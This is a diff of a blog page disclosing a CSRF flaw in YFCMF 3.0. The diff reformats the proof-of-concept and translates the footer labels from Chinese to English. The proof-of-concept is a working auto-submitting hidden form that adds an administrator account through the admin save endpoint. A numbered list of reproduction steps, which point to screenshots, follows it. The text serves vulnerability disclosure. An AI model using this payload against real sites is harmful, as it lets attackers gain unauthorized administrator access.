@@ -111,9 +111,20 @@
 </div>
             <div class="content">
                 <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The background administrator adds CSRF to the page, causing other administrator accounts to add.</p>
-<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;form action=&quot;/YFCMF/admin/admin/adminsave.html&quot; method=&quot;post&quot;&gt;</span><br><span class="line">		&lt;select name=&quot;group_id&quot; required=&quot;&quot;&gt;</span><br><span class="line">			&lt;option value=&quot;2&quot;/&gt;</span><br><span class="line">		&lt;/select&gt;</span><br><span class="line">		&lt;input name=&quot;username&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;</span><br><span class="line">		&lt;input name=&quot;password&quot; value=&quot;123&quot; type=&quot;hidden&quot;/&gt;</span><br><span class="line">		&lt;input name=&quot;email&quot; value=&quot;csrf@1.com&quot; type=&quot;hidden&quot;/&gt;</span><br><span class="line">		&lt;input name=&quot;realname&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">		document.forms[0].submit();</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>1、View original users<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7c4f4.png" alt></p>
+<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre><code>&lt;html&gt;
+    &lt;form action=&quot;/YFCMF/admin/admin/adminsave.html&quot; method=&quot;post&quot;&gt;
+        &lt;select name=&quot;group_id&quot; required=&quot;&quot;&gt;
+            &lt;option value=&quot;2&quot;/&gt;
+        &lt;/select&gt;
+        &lt;input name=&quot;username&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
+        &lt;input name=&quot;password&quot; value=&quot;123&quot; type=&quot;hidden&quot;/&gt;
+        &lt;input name=&quot;email&quot; value=&quot;csrf@1.com&quot; type=&quot;hidden&quot;/&gt;
+        &lt;input name=&quot;realname&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/html&gt;</code></pre><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>1、View original users<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7c4f4.png" alt></p>
 <p>2、Accessing structured CSRF pages<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7ded1.png" alt></p>
 <p>3、Successfully added<br><img src="https://i.loli.net/2018/08/23/5b7e6aac970b0.png" alt><br><img src="https://i.loli.net/2018/08/23/5b7e6aacc099b.png" alt></p>
 
@@ -122,16 +133,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2018/08/23/Csrf in YFCMF 3.0/">https://hpdoger.cn/2018/08/23/Csrf in YFCMF 3.0/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -144,7 +155,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
